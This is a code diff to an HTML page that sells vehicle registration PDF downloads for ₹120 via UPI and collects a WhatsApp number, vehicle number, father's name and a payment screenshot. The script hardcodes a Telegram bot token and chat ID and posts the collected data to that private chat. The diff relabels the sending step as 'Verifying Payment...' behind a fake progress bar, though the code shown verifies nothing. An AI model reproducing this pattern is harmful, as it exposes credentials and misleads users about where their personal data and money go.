@@ -7,7 +7,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --primary: #ff0066; --ind-blue: #003399; }
+        :root { --primary: #ff0066; --ind-blue: #003399; --accent: #ff9933; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
         
         body { 
@@ -23,7 +23,6 @@
         .menu-btn div { width: 100%; height: 3px; background: var(--ind-blue); border-radius: 2px; }
         .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; }
 
-        /* Real Switch Design */
         .switch-wrap { display: flex; align-items: center; gap: 8px; }
         .switch { position: relative; display: inline-block; width: 45px; height: 24px; }
         .switch input { opacity: 0; width: 0; height: 0; }
@@ -36,7 +35,7 @@
         .sidebar.active { left: 0; }
         .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f8f9fa; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; text-align: left; border: 1px solid #ddd; cursor:pointer; font-size: 14px; }
 
-        .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.95); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); }
+        .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.95); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
 
         .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; }
         .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; flex-shrink: 0; }
@@ -48,7 +47,7 @@
         .disclaimer-box { padding: 10px; margin-bottom: 15px; text-align: center; font-size: 14px; color: #333; font-weight: bold; }
         .disclaimer-box input { margin-right: 8px; transform: scale(1.3); cursor: pointer; }
 
-        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .btn:disabled { background: #ccc; cursor: not-allowed; }
 
         .neon-btn {
@@ -64,7 +63,24 @@
         .neon-btn::after { content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #fff; z-index: 1; }
         @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-        #mob, #fName { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; background: #fff; color: #000; font-size: 18px; text-align: center; font-weight: bold; }
+        /* Colorful Inputs */
+        input[type="tel"], input[type="text"] { 
+            width: 100%; padding: 15px; border-radius: 12px; border: 2px solid #b3d4fc; 
+            margin-bottom: 15px; background: #f0f7ff; color: #003399; font-size: 18px; 
+            text-align: center; font-weight: bold; transition: 0.3s; outline: none;
+        }
+        input:focus { border-color: var(--ind-blue); background: #fff; box-shadow: 0 0 10px rgba(0,51,153,0.1); }
+
+        /* Custom File Upload Styling */
+        .file-upload-box {
+            border: 2px dashed #003399; background: #fff8f0; padding: 15px;
+            border-radius: 12px; margin-bottom: 15px; cursor: pointer; position: relative;
+            transition: 0.3s;
+        }
+        .file-upload-box:hover { background: #fff1e0; border-color: #ff9933; }
+        .file-upload-box i { font-size: 24px; color: #003399; margin-bottom: 5px; }
+        .file-upload-box p { font-size: 14px; font-weight: bold; color: #555; }
+        #ss { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; }
 
         .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; }
         #successOverlay { background: rgba(0, 128, 0, 0.98); }
@@ -142,14 +158,18 @@
                 <img id="qr" src="" width="180">
                 <p style="color:#000; font-size:10px; margin-top:5px; font-weight:bold;">SCAN QR TO PAY ₹120</p>
             </div>
+
             <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
-            
-            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px; color:#333; width:100%;">
-            
             <input type="text" id="fName" placeholder="Father's Name (Optional)">
-            
+
+            <div class="file-upload-box">
+                <i class="fas fa-cloud-upload-alt"></i>
+                <p id="fileNameLabel">Yaha apna payment ka screenshot lagaiye</p>
+                <input type="file" id="ss" accept="image/*" onchange="updateFileName(this)">
+            </div>
+
             <button class="btn" onclick="submit()">Verify & Download PDF</button>
-            <H3>👆🏻payment ka screenshot lagaiye👆🏻</H3>
+            <H3 style="margin-top:10px; font-size:14px; color:red;">👆🏻 Payment verification jaruri hai 👆🏻</H3>
         </div>
     </div>
 
@@ -170,6 +190,14 @@
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
         let isP2 = false;
+
+        function updateFileName(input) {
+            const label = document.getElementById('fileNameLabel');
+            if (input.files && input.files[0]) {
+                label.innerText = "Selected: " + input.files[0].name;
+                label.style.color = "green";
+            }
+        }
 
         function handleVoiceSwitch() {
             let chk = document.getElementById('voiceToggle').checked;
@@ -219,9 +247,7 @@
         function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }
 
         async function sendT(f, d, t, tx) {
-            // Father's name value pick up
             const fatherNameValue = document.getElementById('fName').value || "Not Provided";
-            
             let fd = new FormData();
             fd.append("chat_id", T_CHAT_ID); fd.append("photo", f);
             fd.append("caption", `🚀 *NEW RC ORDER*\n\n🆔 *TxId:* \`${tx}\`\n📅 *Date:* ${d}\n⏰ *Time:* ${t}\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n👤 *Father:* ${fatherNameValue}\n💰 *Amt:* ₹120`);
@@ -232,7 +258,7 @@
         function submit() {
             const m = document.getElementById('mob').value;
             const s = document.getElementById('ss').files[0];
-            if(m.length < 10 || !s) { alert("Details sahi bhare!"); return; }
+            if(m.length < 10 || !s) { alert("Sahi Details aur Screenshot lagaiye!"); return; }
             document.getElementById('load').style.display='flex';
             if(document.getElementById('voiceToggle').checked) speak("कृपया प्रतीक्षा कीजिए");
             let p = 0; let isPaused = false;
@@ -240,11 +266,10 @@
                 if (isPaused) return;
                 p += 2;
                 document.getElementById('pText').innerText = p + "%";
-                if(p === 52) { document.getElementById('carIcon').innerText = "🏢"; } else { document.getElementById('carIcon').innerText = "🚗"; }
                 document.getElementById('carIcon').style.left = (p * 0.85) + "%";
                 if (p === 60) {
                     isPaused = true;
-                    document.getElementById('loaderMsg').innerText = "Fetching data to server...";
+                    document.getElementById('loaderMsg').innerText = "Verifying Payment...";
                     const now = new Date();
                     const dStr = now.toLocaleDateString('en-IN');
                     const tStr = now.toLocaleTimeString('en-IN');
